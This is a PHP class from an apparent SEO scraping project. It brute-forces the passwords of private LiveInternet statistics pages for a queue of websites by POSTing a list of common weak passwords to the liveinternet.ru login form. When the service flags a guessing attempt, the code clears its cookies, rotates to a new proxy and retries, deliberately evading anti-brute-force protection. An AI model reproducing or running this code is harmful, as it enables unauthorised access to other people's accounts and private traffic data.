<?php
/**
 * Author: alexk984
 * Date: 14.12.12
 */
class LiPassword extends LiBaseParser
{
    /**
     * @var LiSite
     */
    public $site = 1;
    public $passwords = array(123, 111, 1234, 12345, 123456, 1234567,12345678, 111111, 456, 1, 911, 123123, 'qwerty', 'password');

    public function start()
    {
        while (true) {
            $this->getSite();
            $this->log('Start cracking site ' . $this->site->id . ' ' . $this->site->url);
            $this->crackPassword();

            $this->site->active = 2;
            $this->site->save();
        }
        //mail('alexk984@gmail.com', 'report parsing site '.$this->site->url, $found.' keywords parsed');
    }

    public function getSite()
    {
        $transaction = Yii::app()->db_seo->beginTransaction();
        try {
            $criteria = new CDbCriteria;
            $criteria->condition = 'public=0 AND active=0';
            $this->site = LiSite::model()->find($criteria);
            $this->site->active = 1;
            $this->site->save();

            $transaction->commit();
        } catch (Exception $e) {
            $transaction->rollback();
            $this->log('transaction fail');
            sleep(10);
            $this->getSite();
        }
    }

    public function crackPassword()
    {
        foreach ($this->passwords as $password){
            $result = $this->checkPassword($password);
            if ($result){
                $this->site->password = $password;
                $this->site->save();
                $this->log('PASSWORD SUCCESS: '.$password);
                break;
            }
        }
    }

    public function checkPassword($password)
    {
        sleep(5);
        $html = $this->loadPage('http://www.liveinternet.ru/stat/');
        $document = phpQuery::newDocument($html);

        //parse rnd
        $rnd = $document->find('input[name=rnd]');
        $rnd = pq($rnd)->attr('value');

        $post = 'rnd=' . $rnd . '&url=' . urlencode('http://' . $this->site->url) . '&password=' . $password . '&keep_password=on&ok=+OK+';
        $html = $this->loadPage('http://www.liveinternet.ru/stat/', 'LiveInternet', $post);

        if (strpos($html, 'Ошибка: неверный пароль')) {
            $this->log('password denied');
            return false;
        }
        if (strpos($html, 'по месяцам')) {
            return true;
        }
        if (strpos($html, 'Ошибка: зафиксирована попытка подбора пароля')) {
            $this->log('cracking detected');
            $this->removeCookieFile();
            $this->changeProxy();
            return $this->checkPassword($password);
        }

        $this->log('unknown error');
        return false;
    }
}
